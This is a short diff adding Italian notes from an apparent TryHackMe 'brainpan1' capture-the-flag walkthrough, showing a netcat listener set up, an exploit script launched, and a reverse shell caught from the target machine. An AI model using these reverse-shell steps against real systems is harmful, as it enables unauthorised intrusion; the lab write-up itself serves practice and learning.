@@ -1,0 +1,21 @@
+
+sulla macchina attacker metto in ascolto il listener:
+
+root@kali:~# nc -nlvp 4444
+listening on [any] 4444 ...
+
+
+lancio l'exploit:
+
+root@kali:/opt/TryHackMe/brainpan1# ./18_shellcode.py
+
+
+e.......
+
+connect to [10.8.147.132] from (UNKNOWN) [10.10.171.87] 34688
+CMD Version 1.4.1
+
+Z:\home\puck>
+
+
+siamo DENTRO!
